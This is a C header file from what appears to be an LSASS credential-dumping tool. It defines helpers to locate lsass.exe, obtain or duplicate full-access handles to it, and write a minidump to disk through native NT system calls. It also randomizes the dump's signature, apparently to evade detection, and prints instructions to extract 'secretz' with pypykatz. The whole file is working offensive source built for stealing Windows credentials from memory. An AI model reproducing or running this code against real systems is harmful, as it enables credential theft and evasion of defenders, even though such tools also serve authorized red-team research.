#pragma once
#include <Windows.h>
#include <winternl.h>
#include <stdio.h>

#define LSASS "LSASS"

#ifdef _WIN64
#define CID_OFFSET 0x40
#define PEB_OFFSET 0x60
#define READ_MEMLOC __readgsqword
#else
#define CID_OFFSET 0x20
#define PEB_OFFSET 0x30
#define READ_MEMLOC __readfsdword
#endif

#if _WIN64
#define PROCESS_PARAMETERS_OFFSET 0x20
#define OSMAJORVERSION_OFFSET 0x118
#define OSMINORVERSION_OFFSET 0x11c
#define OSBUILDNUMBER_OFFSET 0x120
#define OSPLATFORMID_OFFSET 0x124
#define CSDVERSION_OFFSET 0x2e8
#define PROCESSOR_ARCHITECTURE AMD64
#else
#define PROCESS_PARAMETERS_OFFSET 0x10
#define OSMAJORVERSION_OFFSET 0xa4
#define OSMINORVERSION_OFFSET 0xa8
#define OSBUILDNUMBER_OFFSET 0xac
#define OSPLATFORMID_OFFSET 0xb0
#define CSDVERSION_OFFSET 0x1f0
#define PROCESSOR_ARCHITECTURE INTEL
#endif

#define MINIDUMP_SIGNATURE 0x504d444d
#define MINIDUMP_VERSION 42899
#define MINIDUMP_IMPL_VERSION 0

#define RVA(type, base_addr, rva) (type)((ULONG_PTR) base_addr + rva)

#define STATUS_PARTIAL_COPY 0x8000000D
#define STATUS_ACCESS_DENIED 0xC0000022
#define STATUS_OBJECT_PATH_NOT_FOUND 0xC000003A
#define STATUS_OBJECT_NAME_NOT_FOUND 0xC0000034
#define STATUS_OBJECT_NAME_INVALID 0xc0000033
#define STATUS_NO_MORE_ENTRIES 0x8000001A
#define STATUS_INVALID_CID 0xC000000B
#define STATUS_INFO_LENGTH_MISMATCH 0xC0000004
#define STATUS_OBJECT_PATH_SYNTAX_BAD 0xC000003B

#define SystemHandleInformation 0x10
#define ObjectTypeInformation 2

#define ADVAPI32_DLL L"Advapi32.dll"

#define NtCurrentProcess() ( (HANDLE)(LONG_PTR) -1 )

#define intAlloc(size) HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, size)
#define intFree(addr) HeapFree(GetProcessHeap(), 0, addr)

#ifdef DEBUG
#define DPRINT(...) { \
     fprintf(stderr, "DEBUG: %s:%d:%s(): ", __FILE__, __LINE__, __FUNCTION__); \
     fprintf(stderr, __VA_ARGS__); \
     fprintf(stderr, "\n"); \
 }

#define DPRINT_ERR(...) { \
     fprintf(stderr, "ERROR: %s:%d:%s(): ", __FILE__, __LINE__, __FUNCTION__); \
     fprintf(stderr, __VA_ARGS__); \
     fprintf(stderr, "\n"); \
 }
#else
#define DPRINT(...)
#define DPRINT_ERR(...)
#endif

#define PRINT(...) { \
     fprintf(stdout, __VA_ARGS__); \
     fprintf(stdout, "\n"); \
 }

#define PRINT_ERR(...) { \
     fprintf(stdout, __VA_ARGS__); \
     fprintf(stdout, "\n"); \
 }

#define syscall_failed(syscall_name, status) \
    DPRINT_ERR( \
        "Failed to call %s, status: 0x%lx", \
        syscall_name, \
        status \
    )

#define function_failed(function) \
    DPRINT_ERR( \
        "Failed to call '%s', error: %ld", \
        function, \
        GetLastError() \
    )

#define malloc_failed() function_failed("HeapAlloc")


struct _RTL_BALANCED_NODE
{
	union
	{
		struct _RTL_BALANCED_NODE* Children[2];                             //0x0
		struct
		{
			struct _RTL_BALANCED_NODE* Left;                                //0x0
			struct _RTL_BALANCED_NODE* Right;                               //0x8
		};
	};
	union
	{
		struct
		{
			UCHAR Red : 1;                                                    //0x10
			UCHAR Balance : 2;                                                //0x10
		};
		ULONGLONG ParentValue;                                              //0x10
	};
};

struct LDR_DATA_TABLE_ENTRY
{
	//struct _LIST_ENTRY InLoadOrderLinks;                                    //0x0
	struct _LIST_ENTRY InMemoryOrderLinks;                                  //0x10
	struct _LIST_ENTRY InInitializationOrderLinks;                          //0x20
	PVOID DllBase;                                                          //0x30
	PVOID EntryPoint;                                                       //0x38
	ULONG32 SizeOfImage;                                                      //0x40
	struct _UNICODE_STRING FullDllName;                                     //0x48
	struct _UNICODE_STRING BaseDllName;                                     //0x58
	UCHAR FlagGroup[4];                                                     //0x68
	USHORT ObsoleteLoadCount;                                               //0x6c
	USHORT TlsIndex;                                                        //0x6e
	struct _LIST_ENTRY HashLinks;                                           //0x70
	ULONG TimeDateStamp;                                                    //0x80
	struct _ACTIVATION_CONTEXT* EntryPointActivationContext;                //0x88
	VOID* Lock;                                                             //0x90
	struct _LDR_DDAG_NODE* DdagNode;                                        //0x98
	struct _LIST_ENTRY NodeModuleLink;                                      //0xa0
	struct _LDRP_LOAD_CONTEXT* LoadContext;                                 //0xb0
	VOID* ParentDllBase;                                                    //0xb8
	VOID* SwitchBackContext;                                                //0xc0
	struct _RTL_BALANCED_NODE BaseAddressIndexNode;                         //0xc8
	struct _RTL_BALANCED_NODE MappingInfoIndexNode;                         //0xe0
	ULONGLONG OriginalBase;                                                 //0xf8
	union _LARGE_INTEGER LoadTime;                                          //0x100
	ULONG BaseNameHashValue;                                                //0x108
	ULONG32 LoadReason;                                                     //0x10c
	ULONG ImplicitPathOptions;                                              //0x110
	ULONG ReferenceCount;                                                   //0x114
	ULONG DependentLoadFlags;                                               //0x118
	UCHAR SigningLevel;                                                     //0x11c
	ULONG CheckSum;                                                         //0x120
};

typedef struct _SYSTEM_HANDLE
{
	ULONG ProcessId;
	BYTE ObjectTypeNumber;
	BYTE Flags;
	USHORT Handle;
	PVOID Object;
	ACCESS_MASK GrantedAccess;
} SYSTEM_HANDLE, * PSYSTEM_HANDLE;

typedef struct _SYSTEM_HANDLE_INFORMATION
{
	ULONG Count;
	SYSTEM_HANDLE Handle[1];
} SYSTEM_HANDLE_INFORMATION, * PSYSTEM_HANDLE_INFORMATION;

typedef struct _linked_list
{
	struct _linked_list* next;
} linked_list, * Plinked_list;

struct _CURDIR
{
	struct _UNICODE_STRING DosPath;
	VOID* Handle;
};

typedef struct _PROCESS_PARAMETERS
{
	ULONG MaximumLength;
	ULONG Length;
	ULONG Flags;
	ULONG DebugFlags;
	VOID* ConsoleHandle;
	ULONG ConsoleFlags;
	VOID* StandardInput;
	VOID* StandardOutput;
	VOID* StandardError;
	struct _CURDIR CurrentDirectory;
	struct _UNICODE_STRING DllPath;
	struct _UNICODE_STRING ImagePathName;
	struct _UNICODE_STRING CommandLine;
} PROCESS_PARAMETERS, * PPROCESS_PARAMETERS;


HANDLE obtain_lsass_handle(DWORD pid, DWORD permissions, BOOL dup, BOOL fork, BOOL is_malseclogon_stage_2, LPCSTR dump_path);
HANDLE duplicate_lsass_handle(DWORD lsass_pid, DWORD permissions);
HANDLE get_process_handle(DWORD dwPid, DWORD dwFlags, BOOL quiet);
HANDLE fork_process(DWORD dwPid, HANDLE hProcess);
HANDLE find_lsass(DWORD dwFlags);
HANDLE make_handle_full_access(HANDLE hProcess);
PSYSTEM_HANDLE_INFORMATION get_all_handles();

HANDLE get_function_address(HMODULE hLibrary, DWORD FunctionHash, WORD Ordinal);
HANDLE get_library_address(LPWSTR LibName, BOOL DoLoad);

static PVOID allocate_memory(PSIZE_T region_size)
{
	PVOID base_address = NULL;

	NTSTATUS status = NtAllocateVirtualMemory(NtCurrentProcess(), &base_address, 0, region_size, MEM_COMMIT, PAGE_READWRITE);
	if (!NT_SUCCESS(status))
	{
		DPRINT_ERR("Could not allocate enough memory to write the dump")
			return NULL;
	}

	DPRINT("Allocated 0x%llx bytes at 0x%p to write the dump", (ULONG64)*region_size, base_address);
	return base_address;
}

static void free_linked_list(PVOID head)
{
	if (!head)
		return;

	Plinked_list node = (Plinked_list)head;
	ULONG32 number_of_nodes = 0;
	while (node)
	{
		number_of_nodes++;
		node = node->next;
	}

	for (int i = number_of_nodes - 1; i >= 0; i--)
	{
		Plinked_list node = (Plinked_list)head;

		int jumps = i;
		while (jumps--)
			node = node->next;

		intFree(node);
		node = NULL;
	}
}

static BOOL is_full_path(LPCSTR filename)
{
	char c;

	c = filename[0] | 0x20;
	if (c < 97 || c > 122)
		return FALSE;

	c = filename[1];
	if (c != ':')
		return FALSE;

	c = filename[2];
	if (c != '\\')
		return FALSE;

	return TRUE;
}

static LPCWSTR get_cwd(VOID)
{
	PVOID pPeb;
	PPROCESS_PARAMETERS pProcParams;

	pPeb = (PVOID)READ_MEMLOC(PEB_OFFSET);
	pProcParams = *RVA(PPROCESS_PARAMETERS*, pPeb, PROCESS_PARAMETERS_OFFSET);
	return pProcParams->CurrentDirectory.DosPath.Buffer;
}

static VOID get_full_path(PUNICODE_STRING full_dump_path, LPCSTR filename)
{
	wchar_t wcFileName[MAX_PATH];

	// add \??\ at the start
	wcscpy(full_dump_path->Buffer, L"\\??\\");

	// if it is just a relative path, add the current directory
	if (!is_full_path(filename))
		wcsncat(full_dump_path->Buffer, get_cwd(), MAX_PATH);

	// convert the path to wide string
	mbstowcs(wcFileName, filename, MAX_PATH);
	// add the file path
	wcsncat(full_dump_path->Buffer, wcFileName, MAX_PATH);

	// set the length fields
	full_dump_path->Length = wcsnlen(full_dump_path->Buffer, MAX_PATH);
	full_dump_path->Length *= 2;
	full_dump_path->MaximumLength = full_dump_path->Length + 2;
}

static BOOL create_file(PUNICODE_STRING full_dump_path)
{
	HANDLE hFile;
	OBJECT_ATTRIBUTES objAttr;
	IO_STATUS_BLOCK IoStatusBlock;

	// init the object attributes
	InitializeObjectAttributes(&objAttr, full_dump_path, OBJ_CASE_INSENSITIVE, NULL, NULL);

	// call NtCreateFile with FILE_OPEN_IF
	// FILE_OPEN_IF: If the file already exists, open it. If it does not, create the given file.
	NTSTATUS status = NtCreateFile(&hFile, FILE_GENERIC_READ, &objAttr, &IoStatusBlock, NULL, FILE_ATTRIBUTE_NORMAL, 0, FILE_OPEN_IF, FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);
	if (status == STATUS_OBJECT_PATH_NOT_FOUND || status == STATUS_OBJECT_NAME_INVALID || status == STATUS_OBJECT_PATH_SYNTAX_BAD)
	{
		PRINT_ERR("The path '%ls' is invalid.", &full_dump_path->Buffer[4])
			return FALSE;
	}

	if (!NT_SUCCESS(status))
	{
		syscall_failed("NtCreateFile", status);
		DPRINT_ERR("Could not create file at %ls", &full_dump_path->Buffer[4]);
		return FALSE;
	}

	NtClose(hFile);
	hFile = NULL;

	DPRINT("File created: %ls", &full_dump_path->Buffer[4]);
	return TRUE;
}

static BOOL delete_file(LPCSTR filepath)
{
	OBJECT_ATTRIBUTES objAttr;
	wchar_t wcFilePath[MAX_PATH];
	UNICODE_STRING UnicodeFilePath;

	UnicodeFilePath.Buffer = wcFilePath;

	get_full_path(&UnicodeFilePath, filepath);

	// init the object attributes
	InitializeObjectAttributes(&objAttr, &UnicodeFilePath, OBJ_CASE_INSENSITIVE, NULL, NULL);

	NTSTATUS status = NtDeleteFile(&objAttr);
	if (!NT_SUCCESS(status))
	{
		syscall_failed("NtDeleteFile", status);
		DPRINT_ERR("Could not delete file: %s", filepath);
		return FALSE;
	}

	DPRINT("Deleted file: %s", filepath);
	return TRUE;
}

static BOOL file_exists(LPCSTR filepath)
{
	HANDLE hFile;
	OBJECT_ATTRIBUTES objAttr;
	IO_STATUS_BLOCK IoStatusBlock;
	LARGE_INTEGER largeInteger;
	largeInteger.QuadPart = 0;
	wchar_t wcFilePath[MAX_PATH];
	UNICODE_STRING UnicodeFilePath;
	UnicodeFilePath.Buffer = wcFilePath;
	get_full_path(&UnicodeFilePath, filepath);

	// init the object attributes
	InitializeObjectAttributes(&objAttr, &UnicodeFilePath, OBJ_CASE_INSENSITIVE, NULL, NULL);

	// call NtCreateFile with FILE_OPEN
	NTSTATUS status = NtCreateFile(&hFile, FILE_GENERIC_READ, &objAttr, &IoStatusBlock, &largeInteger, FILE_ATTRIBUTE_NORMAL, 0, FILE_OPEN, FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);
	if (status == STATUS_OBJECT_NAME_NOT_FOUND)
		return FALSE;

	if (!NT_SUCCESS(status))
	{
		syscall_failed("NtCreateFile", status);
		DPRINT_ERR("Could check if the file %s exists", filepath);
		return FALSE;
	}

	NtClose(hFile);
	hFile = NULL;

	return TRUE;
}

static BOOL write_file(PUNICODE_STRING full_dump_path, PBYTE fileData, ULONG32 fileLength)
{
	HANDLE hFile;
	OBJECT_ATTRIBUTES objAttr;
	IO_STATUS_BLOCK IoStatusBlock;
	LARGE_INTEGER largeInteger;
	largeInteger.QuadPart = fileLength;

	// init the object attributes
	InitializeObjectAttributes(&objAttr, full_dump_path, OBJ_CASE_INSENSITIVE, NULL, NULL);

	// create the file
	NTSTATUS status = NtCreateFile(&hFile, FILE_GENERIC_WRITE, &objAttr, &IoStatusBlock, &largeInteger, FILE_ATTRIBUTE_NORMAL, 0, FILE_OVERWRITE_IF, FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);
	if (status == STATUS_OBJECT_PATH_NOT_FOUND || status == STATUS_OBJECT_NAME_INVALID)
	{
		PRINT_ERR("The path '%ls' is invalid.", &full_dump_path->Buffer[4])
			return FALSE;
	}

	if (!NT_SUCCESS(status))
	{
		syscall_failed("NtCreateFile", status);
		PRINT_ERR("Could not write the dump %ls", &full_dump_path->Buffer[4]);
		return FALSE;
	}

	// write the dump
	status = NtWriteFile(hFile, NULL, NULL, NULL, &IoStatusBlock, fileData, fileLength, NULL, NULL);
	NtClose(hFile);
	hFile = NULL;

	if (!NT_SUCCESS(status))
	{
		syscall_failed("NtWriteFile", status);
		PRINT_ERR("Could not write the dump %ls", &full_dump_path->Buffer[4]);
		return FALSE;
	}

	DPRINT("The dump has been written to %ls", &full_dump_path->Buffer[4]);
	return TRUE;
}

static void generate_invalid_sig(PULONG32 Signature, PSHORT Version, PSHORT ImplementationVersion)
{
	time_t t;
	srand((unsigned)time(&t));

	*Signature = MINIDUMP_SIGNATURE;
	*Version = MINIDUMP_VERSION;
	*ImplementationVersion = MINIDUMP_IMPL_VERSION;
	while (*Signature == MINIDUMP_SIGNATURE ||
		*Version == MINIDUMP_VERSION ||
		*ImplementationVersion == MINIDUMP_IMPL_VERSION)
	{
		*Signature = 0;
		*Signature |= (rand() & 0x7FFF) << 0x11;
		*Signature |= (rand() & 0x7FFF) << 0x02;
		*Signature |= (rand() & 0x0003) << 0x00;

		*Version = 0;
		*Version |= (rand() & 0xFF) << 0x08;
		*Version |= (rand() & 0xFF) << 0x00;

		*ImplementationVersion = 0;
		*ImplementationVersion |= (rand() & 0xFF) << 0x08;
		*ImplementationVersion |= (rand() & 0xFF) << 0x00;
	}
}

static void print_success(LPCSTR dump_path, BOOL use_valid_sig, BOOL write_dump_to_disk)
{
	if (!use_valid_sig)
	{
		PRINT("The minidump has an invalid signature, restore it running:\nbash restore_signature.sh %s", strrchr(dump_path, '\\') ? &strrchr(dump_path, '\\')[1] : dump_path)
	}

	if (write_dump_to_disk)
	{
		PRINT("Done, to get the secretz run:\npython3 -m pypykatz lsa minidump %s", strrchr(dump_path, '\\') ? &strrchr(dump_path, '\\')[1] : dump_path)
	}
	else
	{
		PRINT("Done, to get the secretz run:\npython3 -m pypykatz lsa minidump %s", dump_path)
	}
}

#if defined(NANO) && !defined(SSP)
static PVOID get_process_image(HANDLE hProcess)
{
	NTSTATUS status;
	ULONG BufferLength = 0x200;
	PVOID buffer;

	do
	{
		buffer = intAlloc(BufferLength);
		if (!buffer)
		{
			malloc_failed();
			DPRINT_ERR("Could not get the image of process");
			return NULL;
		}

		status = NtQueryInformationProcess(hProcess, ProcessImageFileName, buffer, BufferLength, &BufferLength);
		if (NT_SUCCESS(status))
			return buffer;

		intFree(buffer);
		buffer = NULL;
	} while (status == STATUS_INFO_LENGTH_MISMATCH);

	syscall_failed("NtQueryInformationProcess", status);
	DPRINT_ERR("Could not get the image of process");
	return NULL;
}

static BOOL is_lsass(HANDLE hProcess)
{
	PUNICODE_STRING image = get_process_image(hProcess);
	if (!image)
		return FALSE;

	if (image->Length == 0)
	{
		intFree(image); image = NULL;
		return FALSE;
	}

	if (wcsstr(image->Buffer, L"\\Windows\\System32\\lsass.exe"))
	{
		intFree(image); image = NULL;
		return TRUE;
	}

	intFree(image); image = NULL;
	return FALSE;
}

static DWORD get_pid(HANDLE hProcess)
{
	PROCESS_BASIC_INFORMATION basic_info;
	PROCESSINFOCLASS ProcessInformationClass = 0;

	NTSTATUS status = NtQueryInformationProcess(hProcess, ProcessInformationClass, &basic_info, sizeof(PROCESS_BASIC_INFORMATION), NULL);
	if (!NT_SUCCESS(status))
	{
		syscall_failed("NtQueryInformationProcess", status);
		return 0;
	}

	return basic_info.UniqueProcessId;
}

static DWORD get_lsass_pid(void)
{
	DWORD lsass_pid;

	HANDLE hProcess = find_lsass(PROCESS_QUERY_INFORMATION);
	if (!hProcess)
		return 0;

	lsass_pid = get_pid(hProcess);
	NtClose(hProcess);
	hProcess = NULL;

	if (!lsass_pid)
	{
		DPRINT_ERR("Could not get the PID of " LSASS);
	}
	else
	{
		DPRINT("Found the PID of " LSASS ": %ld", lsass_pid);
	}

	return lsass_pid;
}

static BOOL kill_process(DWORD pid)
{
	if (!pid)
		return FALSE;

	// open a handle with PROCESS_TERMINATE
	HANDLE hProcess = get_process_handle(pid, PROCESS_TERMINATE, FALSE);
	if (!hProcess)
	{
		DPRINT_ERR("Failed to kill process with PID: %ld", pid);
		return FALSE;
	}

	NTSTATUS status = NtTerminateProcess(hProcess, ERROR_SUCCESS);
	if (!NT_SUCCESS(status))
	{
		syscall_failed("NtTerminateProcess", status);
		DPRINT_ERR("Failed to kill process with PID: %ld", pid);
		return FALSE;
	}

	DPRINT("Killed process with PID: %ld", pid);
	return TRUE;
}

static BOOL wait_for_process(HANDLE hProcess)
{
	NTSTATUS status = NtWaitForSingleObject(hProcess, TRUE, NULL);
	if (!NT_SUCCESS(status))
	{
		syscall_failed("NtWaitForSingleObject", status);
		DPRINT_ERR("Could not wait for process");
		return FALSE;
	}
	return TRUE;
}
#endif